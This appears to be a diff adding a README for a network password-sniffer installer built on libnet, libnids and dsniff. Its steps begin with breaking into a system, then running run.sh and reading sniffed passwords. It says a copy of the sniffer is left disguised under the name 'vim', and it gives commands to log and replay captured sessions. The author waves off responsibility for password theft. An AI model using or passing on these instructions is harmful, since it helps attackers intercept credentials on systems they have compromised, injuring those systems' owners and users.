@@ -1,0 +1,49 @@
+The backbone of this script is
+
+libnet
+libnids
+dsniff
+
+
+This is no special program or nothing, its just a 
+fast hassle free way to install a sniffer on a system
+
+Next version will have more stuff.. can't be arsed right now.
+
+By the way - if you do anything bad with this.. like sniff passwords so be it... 
+its nothing to do with me ok?? 
+
+
+/// INSTALL \\\
+
+1)  h4X0r into a system like a hard man
+2)  Get some milk and cookies
+3)  sh run.sh
+4)  Sleep
+5)  Get up
+6)  Look for sniffed passwords in terminal.
+
+After running run.sh follow onscreen instructions
+
+\\\ RUN ///
+
+Once installed it'll tell you where it is and auto run in your term
+
+Also there will be a file in your current directory called 'vim' - 
+this is just a copy of the sniffer for next time you log in.
+
+./vim -m
+
+To log the sessions:
+
+./vim -m -w save.file    for a while
+
+then...
+
+./vim -r save.file       to read sniffed session
+
+
+laters
+
+c0w-d0g
+
